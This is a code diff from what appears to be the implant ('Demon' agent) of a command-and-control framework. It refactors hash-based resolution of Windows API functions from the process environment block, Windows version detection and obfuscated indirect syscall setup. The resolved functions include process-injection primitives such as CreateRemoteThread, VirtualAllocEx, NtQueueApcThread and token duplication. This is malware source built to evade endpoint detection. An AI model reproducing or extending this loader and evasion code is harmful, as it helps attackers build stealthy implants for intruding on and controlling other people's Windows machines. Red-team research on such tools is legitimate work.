@@ -34,8 +34,9 @@ VOID DemonMain( PVOID ModuleInst )
     PUTS( "Start" )
 
     /* Use passed module agent instance */
-    if ( ModuleInst )
+    if ( ModuleInst ) {
         Instance.Session.ModuleBase = ModuleInst;
+    }
 
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     DemonInit();
@@ -237,7 +238,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
     PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueProcess );
     PackageAddInt32( *MetaData, Instance.Session.PPID );
-    PackageAddInt32( *MetaData, Instance.Session.ProcessArch );
+    PackageAddInt32( *MetaData, PROCESS_AGENT_ARCH );
     PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
 
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
@@ -276,133 +277,125 @@ VOID DemonInit( VOID )
     PUTS( "TRANSPORT_SMB" )
 #endif
 
-    Instance.Modules.Kernel32 = LdrModulePeb( HASH_KERNEL32 );
-    Instance.Modules.Ntdll    = LdrModulePeb( HASH_NTDLL );
 
-    if ( ( ! Instance.Modules.Kernel32 ) || ( Instance.Modules.Ntdll ) )
-    {
-        // Ntdll
-        Instance.Win32.LdrGetProcedureAddress              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_LdrGetProcedureAddress );
-        Instance.Win32.LdrLoadDll                          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_LdrLoadDll  );
-        Instance.Win32.RtlAllocateHeap                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlAllocateHeap );
-        Instance.Win32.RtlReAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlReAllocateHeap );
-        Instance.Win32.RtlFreeHeap                         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlFreeHeap );
-        Instance.Win32.RtlExitUserThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlExitUserThread );
-        Instance.Win32.RtlExitUserProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlExitUserProcess );
-        Instance.Win32.RtlRandomEx                         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlRandomEx );
-        Instance.Win32.RtlNtStatusToDosError               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlNtStatusToDosError );
-        Instance.Win32.RtlGetVersion                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlGetVersion );
-        Instance.Win32.RtlCreateTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCreateTimerQueue );
-        Instance.Win32.RtlCreateTimer                      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCreateTimer );
-        Instance.Win32.RtlDeleteTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlDeleteTimerQueue );
-        Instance.Win32.RtlCaptureContext                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlCaptureContext );
-        Instance.Win32.RtlAddVectoredExceptionHandler      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlAddVectoredExceptionHandler );
-        Instance.Win32.RtlRemoveVectoredExceptionHandler   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_RtlRemoveVectoredExceptionHandler );
-        Instance.Win32.NtClose                             = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtClose );
-        Instance.Win32.NtCreateEvent                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateEvent );
-        Instance.Win32.NtSetEvent                          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSetEvent );
+    /* resolve ntdll.dll functions */
+    if ( ( Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
+        Instance.Win32.LdrGetProcedureAddress            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRGETPROCEDUREADDRESS );
+        Instance.Win32.LdrLoadDll                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRLOADDLL );
 
-        // Kernel32
-        Instance.Win32.VirtualProtectEx                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualProtectEx );
-        Instance.Win32.VirtualProtect                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualProtect );
-        Instance.Win32.LocalAlloc                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalAlloc );
-        Instance.Win32.LocalReAlloc                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalReAlloc );
-        Instance.Win32.LocalFree                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalFree );
-        Instance.Win32.CreateRemoteThread                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateRemoteThread );
-        Instance.Win32.CreateToolhelp32Snapshot            = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateToolhelp32Snapshot );
-        Instance.Win32.Process32FirstW                     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32FirstW );
-        Instance.Win32.Process32NextW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32NextW );
-        Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreatePipe );
-        Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessA );
-        Instance.Win32.CreateProcessW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessW );
-        Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFileW );
-        Instance.Win32.GetFullPathNameW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFullPathNameW );
-        Instance.Win32.GetFileSize                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileSize );
-        Instance.Win32.CreateNamedPipeW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateNamedPipeW );
-        Instance.Win32.ConvertFiberToThread                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConvertFiberToThread );
-        Instance.Win32.CreateFiberEx                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFiberEx );
-        Instance.Win32.ReadFile                            = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ReadFile );
-        Instance.Win32.VirtualAllocEx                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_VirtualAllocEx );
-        Instance.Win32.WaitForSingleObjectEx               = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WaitForSingleObjectEx );
-        Instance.Win32.ResumeThread                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ResumeThread );
-        Instance.Win32.OpenThread                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_OpenThread );
-        Instance.Win32.Thread32Next                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Thread32Next );
-        Instance.Win32.Thread32First                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Thread32First );
-        Instance.Win32.GetComputerNameExA                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetComputerNameExA );
-        Instance.Win32.ExitProcess                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ExitProcess );
-        Instance.Win32.GetExitCodeProcess                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetExitCodeProcess );
-        Instance.Win32.GetExitCodeThread                   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetExitCodeThread );
-        Instance.Win32.TerminateProcess                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_TerminateProcess );
-        Instance.Win32.GetTickCount                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetTickCount );
-        Instance.Win32.ReadProcessMemory                   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ReadProcessMemory );
-        Instance.Win32.ConvertThreadToFiberEx              = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConvertThreadToFiberEx );
-        Instance.Win32.SwitchToFiber                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SwitchToFiber );
-        Instance.Win32.DeleteFiber                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DeleteFiber );
-        Instance.Win32.GetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetThreadContext );
-        Instance.Win32.SetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetThreadContext );
-        Instance.Win32.AllocConsole                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_AllocConsole );
-        Instance.Win32.FreeConsole                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FreeConsole );
-        Instance.Win32.GetConsoleWindow                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetConsoleWindow );
-        Instance.Win32.GetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetStdHandle );
-        Instance.Win32.SetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetStdHandle );
-        Instance.Win32.WaitNamedPipeW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WaitNamedPipeW  );
-        Instance.Win32.PeekNamedPipe                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_PeekNamedPipe );
-        Instance.Win32.DisconnectNamedPipe                 = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DisconnectNamedPipe );
-        Instance.Win32.WriteFile                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WriteFile );
-        Instance.Win32.ConnectNamedPipe                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConnectNamedPipe );
-        Instance.Win32.FreeLibrary                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FreeLibrary );
-        Instance.Win32.GetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetCurrentDirectoryW );
-        Instance.Win32.GetFileAttributesW                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileAttributesW );
-        Instance.Win32.FindFirstFileW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindFirstFileW );
-        Instance.Win32.FindNextFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindNextFileW );
-        Instance.Win32.FindClose                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindClose );
-        Instance.Win32.FileTimeToSystemTime                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FileTimeToSystemTime );
-        Instance.Win32.SystemTimeToTzSpecificLocalTime     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SystemTimeToTzSpecificLocalTime );
-        Instance.Win32.RemoveDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_RemoveDirectoryW );
-        Instance.Win32.DeleteFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DeleteFileW );
-        Instance.Win32.CreateDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateDirectoryW );
-        Instance.Win32.CopyFileW                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CopyFileW );
-        Instance.Win32.InitializeProcThreadAttributeList   = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_InitializeProcThreadAttributeList );
-        Instance.Win32.UpdateProcThreadAttribute           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_UpdateProcThreadAttribute  );
-        Instance.Win32.SetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_SetCurrentDirectoryW );
-        Instance.Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64DisableWow64FsRedirection );
-        Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64RevertWow64FsRedirection );
-        Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetModuleHandleA );
-        Instance.Win32.GetSystemTimeAsFileTime             = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetSystemTimeAsFileTime );
-        Instance.Win32.GetLocalTime                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetLocalTime );
-        Instance.Win32.DuplicateHandle                     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DuplicateHandle );
+        Instance.Win32.RtlAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLALLOCATEHEAP );
+        Instance.Win32.RtlReAllocateHeap                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREALLOCATEHEAP );
+        Instance.Win32.RtlFreeHeap                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLFREEHEAP );
+        Instance.Win32.RtlExitUserThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
+        Instance.Win32.RtlExitUserProcess                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLEXITUSERPROCESS );
+        Instance.Win32.RtlRandomEx                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLRANDOMEX );
+        Instance.Win32.RtlNtStatusToDosError             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLNTSTATUSTODOSERROR );
+        Instance.Win32.RtlGetVersion                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLGETVERSION );
+        Instance.Win32.RtlCreateTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
+        Instance.Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCREATETIMER );
+        Instance.Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
+        Instance.Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
+        Instance.Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
+        Instance.Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
 
+        Instance.Win32.NtClose                           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCLOSE );
+        Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
+        Instance.Win32.NtSetEvent                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETEVENT );
+        Instance.Win32.NtSetInformationThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
+    } else {
+        PUTS( "Failed to load ntdll from PEB" )
+        return;
     }
 
-    // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
-    Instance.Win32.RtlGetVersion( &OSVersionExW );
-    if ( OSVersionExW.dwMajorVersion >= 5 )
-    {
-        Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;
+    /* resolve Windows version */
+    Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;
+    if ( NT_SUCCESS( Instance.Win32.RtlGetVersion( &OSVersionExW ) ) ) {
+        if ( OSVersionExW.dwMajorVersion >= 5 ) {
+            if ( OSVersionExW.dwMajorVersion == 5 ) {
+                if ( OSVersionExW.dwMinorVersion == 1 ) {
+                    Instance.Session.OSVersion = WIN_VERSION_XP;
+                }
+            } else if ( OSVersionExW.dwMajorVersion == 6 ) {
+                if ( OSVersionExW.dwMinorVersion == 0 ) {
+                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
+                } else if ( OSVersionExW.dwMinorVersion == 1 ) {
+                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
+                } else if ( OSVersionExW.dwMinorVersion == 2 ) {
+                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
+                } else if ( OSVersionExW.dwMinorVersion == 3 ) {
+                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
+                }
+            } else if ( OSVersionExW.dwMajorVersion == 10 ) {
+                if ( OSVersionExW.dwMinorVersion == 0 ) {
+                    Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
+                }
+            }
+        }
+    } PRINTF( "OSVersion: %d\n", Instance.Session.OSVersion );
 
-        if ( OSVersionExW.dwMajorVersion == 5 )
-        {
-            if ( OSVersionExW.dwMinorVersion == 1 )
-                Instance.Session.OSVersion = WIN_VERSION_XP;
-        }
-        else if ( OSVersionExW.dwMajorVersion == 6 )
-        {
-            if ( OSVersionExW.dwMinorVersion == 0 )
-                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
-            else if ( OSVersionExW.dwMinorVersion == 1 )
-                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
-            else if ( OSVersionExW.dwMinorVersion == 2 )
-                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
-            else if ( OSVersionExW.dwMinorVersion == 3 )
-                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
-        }
-        else if ( OSVersionExW.dwMajorVersion == 10 )
-        {
-            if ( OSVersionExW.dwMinorVersion == 0 )
-                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
-        }
+    /* load kernel32.dll functions */
+    if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
+        Instance.Win32.VirtualProtectEx                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
+        Instance.Win32.VirtualProtect                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
+        Instance.Win32.LocalAlloc                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALALLOC );
+        Instance.Win32.LocalReAlloc                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALREALLOC );
+        Instance.Win32.LocalFree                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_LOCALFREE );
+        Instance.Win32.CreateRemoteThread              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEREMOTETHREAD );
+        Instance.Win32.CreateToolhelp32Snapshot        = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATETOOLHELP32SNAPSHOT );
+        Instance.Win32.Process32FirstW                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PROCESS32FIRSTW );
+        Instance.Win32.Process32NextW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PROCESS32NEXTW );
+        Instance.Win32.CreatePipe                      = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEPIPE );
+        Instance.Win32.CreateProcessW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEPROCESSW );
+        Instance.Win32.GetFullPathNameW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFULLPATHNAMEW );
+        Instance.Win32.CreateFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFILEW );
+        Instance.Win32.GetFileSize                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILESIZE );
+        Instance.Win32.CreateNamedPipeW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATENAMEDPIPEW );
+        Instance.Win32.ConvertFiberToThread            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
+        Instance.Win32.CreateFiberEx                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFIBEREX );
+        Instance.Win32.ReadFile                        = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_READFILE );
+        Instance.Win32.VirtualAllocEx                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
+        Instance.Win32.WaitForSingleObjectEx           = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
+        Instance.Win32.Thread32Next                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_THREAD32NEXT );
+        Instance.Win32.Thread32First                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_THREAD32FIRST );
+        Instance.Win32.GetComputerNameExA              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEEXA );
+        Instance.Win32.GetExitCodeProcess              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETEXITCODEPROCESS );
+        Instance.Win32.GetExitCodeThread               = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETEXITCODETHREAD );
+        Instance.Win32.TerminateProcess                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_TERMINATEPROCESS );
+        Instance.Win32.GetTickCount                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETTICKCOUNT );
+        Instance.Win32.ReadProcessMemory               = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_READPROCESSMEMORY );
+        Instance.Win32.ConvertThreadToFiberEx          = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONVERTTHREADTOFIBEREX );
+        Instance.Win32.SwitchToFiber                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SWITCHTOFIBER );
+        Instance.Win32.DeleteFiber                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DELETEFIBER );
+        Instance.Win32.AllocConsole                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_ALLOCCONSOLE );
+        Instance.Win32.FreeConsole                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FREECONSOLE );
+        Instance.Win32.GetConsoleWindow                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCONSOLEWINDOW );
+        Instance.Win32.GetStdHandle                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETSTDHANDLE );
+        Instance.Win32.SetStdHandle                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SETSTDHANDLE );
+        Instance.Win32.WaitNamedPipeW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WAITNAMEDPIPEW  );
+        Instance.Win32.PeekNamedPipe                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_PEEKNAMEDPIPE );
+        Instance.Win32.DisconnectNamedPipe             = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DISCONNECTNAMEDPIPE );
+        Instance.Win32.WriteFile                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WRITEFILE );
+        Instance.Win32.ConnectNamedPipe                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONNECTNAMEDPIPE );
+        Instance.Win32.FreeLibrary                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FREELIBRARY );
+        Instance.Win32.GetCurrentDirectoryW            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETCURRENTDIRECTORYW );
+        Instance.Win32.GetFileAttributesW              = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILEATTRIBUTESW );
+        Instance.Win32.FindFirstFileW                  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDFIRSTFILEW );
+        Instance.Win32.FindNextFileW                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDNEXTFILEW );
+        Instance.Win32.FindClose                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FINDCLOSE );
+        Instance.Win32.FileTimeToSystemTime            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_FILETIMETOSYSTEMTIME );
+        Instance.Win32.SystemTimeToTzSpecificLocalTime = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME );
+        Instance.Win32.RemoveDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_REMOVEDIRECTORYW );
+        Instance.Win32.DeleteFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DELETEFILEW );
+        Instance.Win32.CreateDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEDIRECTORYW );
+        Instance.Win32.CopyFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_COPYFILEW );
+        Instance.Win32.SetCurrentDirectoryW            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SETCURRENTDIRECTORYW );
+        Instance.Win32.Wow64DisableWow64FsRedirection  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64DISABLEWOW64FSREDIRECTION );
+        Instance.Win32.Wow64RevertWow64FsRedirection   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64REVERTWOW64FSREDIRECTION );
+        Instance.Win32.GetModuleHandleA                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETMODULEHANDLEA );
+        Instance.Win32.GetSystemTimeAsFileTime         = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETSYSTEMTIMEASFILETIME );
+        Instance.Win32.GetLocalTime                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETLOCALTIME );
+        Instance.Win32.DuplicateHandle                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DUPLICATEHANDLE );
     }
-    PRINTF( "OSVersion: %d\n", Instance.Session.OSVersion );
 
 #ifdef OBF_SYSCALL
     if ( Instance.Session.OSVersion > WIN_VERSION_10 )
@@ -412,78 +405,77 @@ VOID DemonInit( VOID )
 
         PSYSCALL_STUB   Syscalls        = Instance.Win32.LocalAlloc( LPTR, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
         HMODULE         pNtdll          = SyscallLdrNtdll();
-        DWORD           SyscallCounter  = SyscallsExtract( pNtdll, Syscalls );
+        DWORD           SyscallCounter  = SyscallsExtract( U_PTR( pNtdll ), Syscalls );
 
-        Instance.Syscall.NtOpenProcess                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenProcess );
-        Instance.Syscall.NtQueryInformationProcess         = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryInformationProcess );
-        Instance.Syscall.NtQuerySystemInformation          = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQuerySystemInformation );
-        Instance.Syscall.NtAllocateVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtAllocateVirtualMemory );
-        Instance.Syscall.NtQueueApcThread                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueueApcThread );
-        Instance.Syscall.NtOpenThread                      = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenThread );
-        Instance.Syscall.NtResumeThread                    = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtResumeThread );
-        Instance.Syscall.NtSuspendThread                   = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSuspendThread );
-        Instance.Syscall.NtCreateEvent                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtCreateEvent );
-        Instance.Syscall.NtDuplicateObject                 = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtDuplicateObject );
-        Instance.Syscall.NtGetContextThread                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtGetContextThread );
-        Instance.Syscall.NtSetContextThread                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSetContextThread );
-        Instance.Syscall.NtWaitForSingleObject             = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtWaitForSingleObject );
-        Instance.Syscall.NtAlertResumeThread               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtAlertResumeThread );
-        Instance.Syscall.NtSignalAndWaitForSingleObject    = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtSignalAndWaitForSingleObject );
-        Instance.Syscall.NtTestAlert                       = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtTestAlert );
-        Instance.Syscall.NtCreateThreadEx                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtCreateThreadEx );
-        Instance.Syscall.NtOpenProcessToken                = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtOpenProcessToken );
-        Instance.Syscall.NtDuplicateToken                  = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtDuplicateToken );
-        Instance.Syscall.NtProtectVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtProtectVirtualMemory  );
